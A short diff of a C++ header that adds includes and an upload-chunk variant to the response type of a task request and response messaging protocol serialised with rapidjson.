@@ -2,9 +2,12 @@
 #pragma once
 #include <string>
 #include <variant>
+#include <deque>
+#include "Command.h"
 #include "rapidjson/stringbuffer.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
+#include "Upload.h"
 
 // Task Codes
 #define NO_CODE 0
@@ -184,7 +187,10 @@ using Request = std::variant<
 	TaskRequest<CommandUploadFile>,
 	TaskRequest<CommandDownloadFile>,
 	TaskRequest<bool>>;
-using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
+using Response = std::variant<
+	TaskResponse<TaskSuccess>, 
+	TaskResponse<TaskError>,
+	TaskResponse<Upload::Chunk>>;
 
 inline std::string CreateResponseTaskValue(const std::deque<Response> &tasks)
 {
